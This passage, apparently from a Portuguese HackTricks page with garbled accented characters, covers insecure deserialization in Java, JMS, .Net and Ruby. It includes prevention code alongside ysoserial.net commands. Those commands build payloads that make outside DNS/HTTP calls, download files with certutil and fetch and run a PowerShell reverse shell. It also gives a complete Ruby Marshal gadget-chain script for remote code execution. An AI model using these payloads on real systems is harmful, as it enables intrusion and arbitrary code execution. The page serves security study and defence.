* **RMI sobre HTTP**: Este m√©todo √© comumente usado por aplica√ß√µes web de cliente grosso baseadas em Java, utilizando serializa√ß√£o para todas as comunica√ß√µes de objetos.
* **JMX (Java Management Extensions)**: O JMX utiliza serializa√ß√£o para transmitir objetos pela rede.
* **Protocolos Personalizados**: Em Java, a pr√°tica padr√£o envolve a transmiss√£o de objetos Java brutos, que ser√° demonstrada em exemplos de explora√ß√£o futuros.

### Prevention

#### Objetos Transientes

Uma classe que implementa `Serializable` pode implementar como `transient` qualquer objeto dentro da classe que n√£o deveria ser serializ√°vel. Por exemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evite a serializa√ß√£o de uma classe que precisa implementar Serializable

Em cen√°rios onde certos **objetos devem implementar a interface `Serializable`** devido √† hierarquia de classes, h√° um risco de desserializa√ß√£o n√£o intencional. Para evitar isso, garanta que esses objetos sejam n√£o desserializ√°veis definindo um m√©todo `readObject()` `final` que sempre lan√ßa uma exce√ß√£o, como mostrado abaixo:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Aprimorando a Seguran√ßa de Desserializa√ß√£o em Java**

**Personalizando `java.io.ObjectInputStream`** √© uma abordagem pr√°tica para garantir processos de desserializa√ß√£o. Este m√©todo √© adequado quando:

* O c√≥digo de desserializa√ß√£o est√° sob seu controle.
* As classes esperadas para desserializa√ß√£o s√£o conhecidas.

Substitua o **`resolveClass()`** m√©todo para limitar a desserializa√ß√£o apenas √†s classes permitidas. Isso impede a desserializa√ß√£o de qualquer classe, exceto aquelas explicitamente permitidas, como no seguinte exemplo que restringe a desserializa√ß√£o apenas √† classe `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Usando um Agente Java para Aumento de Seguran√ßa** oferece uma solu√ß√£o alternativa quando a modifica√ß√£o de c√≥digo n√£o √© poss√≠vel. Este m√©todo se aplica principalmente para **colocar em lista negra classes prejudiciais**, usando um par√¢metro JVM:
```
-javaagent:name-of-agent.jar
```
Fornece uma maneira de proteger a desserializa√ß√£o dinamicamente, ideal para ambientes onde mudan√ßas imediatas de c√≥digo s√£o impratic√°veis.

Verifique um exemplo em [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementando Filtros de Serializa√ß√£o**: O Java 9 introduziu filtros de serializa√ß√£o atrav√©s da interface **`ObjectInputFilter`**, fornecendo um mecanismo poderoso para especificar crit√©rios que os objetos serializados devem atender antes de serem desserializados. Esses filtros podem ser aplicados globalmente ou por fluxo, oferecendo um controle granular sobre o processo de desserializa√ß√£o.

Para utilizar filtros de serializa√ß√£o, voc√™ pode definir um filtro global que se aplica a todas as opera√ß√µes de desserializa√ß√£o ou configur√°-lo dinamicamente para fluxos espec√≠ficos. Por exemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Aproveitando Bibliotecas Externas para Seguran√ßa Aprimorada**: Bibliotecas como **NotSoSerial**, **jdeserialize** e **Kryo** oferecem recursos avan√ßados para controlar e monitorar a desserializa√ß√£o em Java. Essas bibliotecas podem fornecer camadas adicionais de seguran√ßa, como a lista branca ou lista negra de classes, an√°lise de objetos serializados antes da desserializa√ß√£o e implementa√ß√£o de estrat√©gias de serializa√ß√£o personalizadas.

* **NotSoSerial** intercepta processos de desserializa√ß√£o para evitar a execu√ß√£o de c√≥digo n√£o confi√°vel.
* **jdeserialize** permite a an√°lise de objetos Java serializados sem desserializ√°-los, ajudando a identificar conte√∫do potencialmente malicioso.
* **Kryo** √© uma estrutura de serializa√ß√£o alternativa que enfatiza velocidade e efici√™ncia, oferecendo estrat√©gias de serializa√ß√£o configur√°veis que podem aumentar a seguran√ßa.

### Refer√™ncias

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Palestra sobre desserializa√ß√£o e ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Palestra sobre gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) e slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Artigo Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Artigo sobre desserializa√ß√µes em Java e .Net JSON: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** palestra: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) e slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVEs de desserializa√ß√µes: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Inje√ß√£o JNDI & log4Shell

Descubra o que √© **Inje√ß√£o JNDI, como abusar dela via RMI, CORBA & LDAP e como explorar log4shell** (e um exemplo dessa vulnerabilidade) na p√°gina a seguir:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> A API **Java Message Service** (**JMS**) √© uma API de middleware orientada a mensagens em Java para enviar mensagens entre dois ou mais clientes. √â uma implementa√ß√£o para lidar com o problema do produtor-consumidor. JMS √© parte da Plataforma Java, Edi√ß√£o Empresarial (Java EE), e foi definida por uma especifica√ß√£o desenvolvida na Sun Microsystems, mas que desde ent√£o tem sido guiada pelo Processo da Comunidade Java. √â um padr√£o de mensagens que permite que componentes de aplica√ß√£o baseados em Java EE criem, enviem, recebam e leiam mensagens. Permite que a comunica√ß√£o entre diferentes componentes de uma aplica√ß√£o distribu√≠da seja fracamente acoplada, confi√°vel e ass√≠ncrona. (De [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produtos

Existem v√°rios produtos que usam esse middleware para enviar mensagens:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Explora√ß√£o

Portanto, basicamente h√° um **monte de servi√ßos usando JMS de maneira perigosa**. Portanto, se voc√™ tiver **privil√©gios suficientes** para enviar mensagens para esses servi√ßos (geralmente voc√™ precisar√° de credenciais v√°lidas), poder√° enviar **objetos maliciosos serializados que ser√£o desserializados pelo consumidor/assinante**.\
Isso significa que, nesta explora√ß√£o, todos os **clientes que v√£o usar essa mensagem ser√£o infectados**.

Voc√™ deve lembrar que, mesmo que um servi√ßo seja vulner√°vel (porque est√° desserializando de forma insegura a entrada do usu√°rio), voc√™ ainda precisa encontrar gadgets v√°lidos para explorar a vulnerabilidade.

A ferramenta [JMET](https://github.com/matthiaskaiser/jmet) foi criada para **conectar e atacar esses servi√ßos enviando v√°rios objetos maliciosos serializados usando gadgets conhecidos**. Esses exploits funcionar√£o se o servi√ßo ainda for vulner√°vel e se algum dos gadgets usados estiver dentro da aplica√ß√£o vulner√°vel.

### Refer√™ncias

* Palestra JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

No contexto do .Net, os exploits de desserializa√ß√£o operam de maneira semelhante √†queles encontrados em Java, onde gadgets s√£o explorados para executar c√≥digo espec√≠fico durante a desserializa√ß√£o de um objeto.

### Impress√£o Digital

#### WhiteBox

O c√≥digo-fonte deve ser inspecionado em busca de ocorr√™ncias de:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

O foco deve estar em serializadores que permitem que o tipo seja determinado por uma vari√°vel sob controle do usu√°rio.

#### BlackBox

A busca deve se concentrar na string codificada em Base64 **AAEAAAD/////** ou qualquer padr√£o semelhante que possa passar por desserializa√ß√£o no lado do servidor, concedendo controle sobre o tipo a ser desserializado. Isso pode incluir, mas n√£o se limita a, estruturas **JSON** ou **XML** apresentando `TypeObject` ou `$type`.

### ysoserial.net

Neste caso, voc√™ pode usar a ferramenta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **criar os exploits de desserializa√ß√£o**. Uma vez baixado o reposit√≥rio git, voc√™ deve **compilar a ferramenta** usando o Visual Studio, por exemplo.

Se voc√™ quiser aprender sobre **como o ysoserial.net cria seu exploit**, pode [**verificar esta p√°gina onde √© explicado o gadget ObjectDataProvider + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

As principais op√ß√µes do **ysoserial.net** s√£o: **`--gadget`**, **`--formatter`**, **`--output`** e **`--plugin`.**

* **`--gadget`** usado para indicar o gadget a ser abusado (indicar a classe/fun√ß√£o que ser√° abusada durante a desserializa√ß√£o para executar comandos).
* **`--formatter`**, usado para indicar o m√©todo para serializar o exploit (voc√™ precisa saber qual biblioteca est√° usando o back-end para desserializar a carga e usar a mesma para serializ√°-la)
* **`--output`** usado para indicar se voc√™ deseja o exploit em **raw** ou **base64** codificado. _Note que **ysoserial.net** ir√° **codificar** a carga usando **UTF-16LE** (codifica√ß√£o usada por padr√£o no Windows), ent√£o se voc√™ pegar o raw e apenas codific√°-lo a partir de um console linux, pode ter alguns **problemas de compatibilidade de codifica√ß√£o** que impedir√£o o exploit de funcionar corretamente (na caixa JSON do HTB, a carga funcionou tanto em UTF-16LE quanto em ASCII, mas isso n√£o significa que sempre funcionar√°)._
* **`--plugin`** ysoserial.net suporta plugins para criar **exploits para frameworks espec√≠ficos** como ViewState

#### Mais par√¢metros do ysoserial.net

* `--minify` fornecer√° uma **carga √∫til menor** (se poss√≠vel)
* `--raf -f Json.Net -c "anything"` Isso indicar√° todos os gadgets que podem ser usados com um formatador fornecido (`Json.Net` neste caso)
* `--sf xml` voc√™ pode **indicar um gadget** (`-g`) e ysoserial.net ir√° procurar por formatadores contendo "xml" (sem distin√ß√£o entre mai√∫sculas e min√∫sculas)

**Exemplos de ysoserial** para criar exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** tamb√©m possui um **par√¢metro muito interessante** que ajuda a entender melhor como cada exploit funciona: `--test`\
Se voc√™ indicar este par√¢metro, **ysoserial.net** ir√° **tentar** o **exploit localmente,** para que voc√™ possa testar se seu payload funcionar√° corretamente.\
Este par√¢metro √© √∫til porque se voc√™ revisar o c√≥digo, encontrar√° trechos de c√≥digo como o seguinte (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Isso significa que, para testar a explora√ß√£o, o c√≥digo chamar√° [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
No **c√≥digo anterior √© vulner√°vel ao exploit criado**. Portanto, se voc√™ encontrar algo semelhante em uma aplica√ß√£o .Net, isso significa que provavelmente essa aplica√ß√£o tamb√©m √© vulner√°vel.\
Assim, o **`--test`** permite entender **quais partes do c√≥digo s√£o vulner√°veis** ao exploit de deserializa√ß√£o que **ysoserial.net** pode criar.

### ViewState

D√™ uma olhada [neste POST sobre **como tentar explorar o par√¢metro \_\_ViewState do .Net**](exploiting-\_\_viewstate-parameter.md) para **executar c√≥digo arbitr√°rio.** Se voc√™ **j√° conhece os segredos** usados pela m√°quina da v√≠tima, [**leia este post para saber como executar c√≥digo**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Preven√ß√£o

Para mitigar os riscos associados √† deserializa√ß√£o em .Net:

* **Evite permitir que fluxos de dados definam seus tipos de objeto.** Utilize `DataContractSerializer` ou `XmlSerializer` sempre que poss√≠vel.
* **Para `JSON.Net`, defina `TypeNameHandling` como `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Evite usar `JavaScriptSerializer` com um `JavaScriptTypeResolver`.**
* **Limite os tipos que podem ser deserializados**, entendendo os riscos inerentes aos tipos .Net, como `System.IO.FileInfo`, que pode modificar as propriedades de arquivos do servidor, potencialmente levando a ataques de nega√ß√£o de servi√ßo.
* **Tenha cautela com tipos que possuem propriedades arriscadas**, como `System.ComponentModel.DataAnnotations.ValidationException` com sua propriedade `Value`, que pode ser explorada.
* **Controle a inst√¢ncia de tipos de forma segura** para evitar que atacantes influenciem o processo de deserializa√ß√£o, tornando at√© mesmo `DataContractSerializer` ou `XmlSerializer` vulner√°veis.
* **Implemente controles de lista branca** usando um `SerializationBinder` personalizado para `BinaryFormatter` e `JSON.Net`.
* **Mantenha-se informado sobre gadgets de deserializa√ß√£o inseguros conhecidos** dentro do .Net e assegure-se de que os deserializadores n√£o instanciem tais tipos.
* **Isolar c√≥digo potencialmente arriscado** de c√≥digo com acesso √† internet para evitar expor gadgets conhecidos, como `System.Windows.Data.ObjectDataProvider` em aplica√ß√µes WPF, a fontes de dados n√£o confi√°veis.

### **Refer√™ncias**

* Artigo sobre deserializa√ß√£o JSON em Java e .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** palestra: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) e slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Em Ruby, a serializa√ß√£o √© facilitada por dois m√©todos dentro da biblioteca **marshal**. O primeiro m√©todo, conhecido como **dump**, √© usado para transformar um objeto em um fluxo de bytes. Esse processo √© chamado de serializa√ß√£o. Por outro lado, o segundo m√©todo, **load**, √© empregado para reverter um fluxo de bytes de volta em um objeto, um processo conhecido como deserializa√ß√£o.

Para proteger objetos serializados, **Ruby utiliza HMAC (Hash-Based Message Authentication Code)**, garantindo a integridade e autenticidade dos dados. A chave utilizada para esse prop√≥sito √© armazenada em um dos v√°rios locais poss√≠veis:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Deserializa√ß√£o gen√©rica do Ruby 2.X para cadeia de gadgets RCE (mais informa√ß√µes em** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**):**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Outras cadeias de RCE para explorar Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### M√©todo Ruby .send()

Como explicado em [**este relat√≥rio de vulnerabilidade**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), se alguma entrada n√£o sanitizada de usu√°rio chegar ao m√©todo `.send()` de um objeto ruby, esse m√©todo permite **invocar qualquer outro m√©todo** do objeto com quaisquer par√¢metros.

Por exemplo, chamar eval e ent√£o c√≥digo ruby como segundo par√¢metro permitir√° executar c√≥digo arbitr√°rio:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Al√©m disso, se apenas um par√¢metro de **`.send()`** for controlado por um atacante, como mencionado na descri√ß√£o anterior, √© poss√≠vel chamar qualquer m√©todo do objeto que **n√£o precisa de argumentos** ou cujos argumentos t√™m **valores padr√£o**.\
Para isso, √© poss√≠vel enumerar todos os m√©todos do objeto para **encontrar alguns m√©todos interessantes que atendam a esses requisitos**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporte o HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
